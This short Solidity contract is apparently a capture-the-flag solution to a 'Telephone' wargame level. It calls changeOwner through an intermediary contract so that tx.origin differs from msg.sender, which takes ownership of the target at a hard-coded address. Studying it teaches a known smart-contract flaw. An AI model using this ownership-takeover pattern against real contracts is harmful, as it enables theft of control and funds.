// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract MySolution {
    function run() external {
        Telephone myContract = Telephone(0x8aCd85898458400f7Db866d53FCFF6f0D49741FF);

        myContract.changeOwner(msg.sender);
    }
}
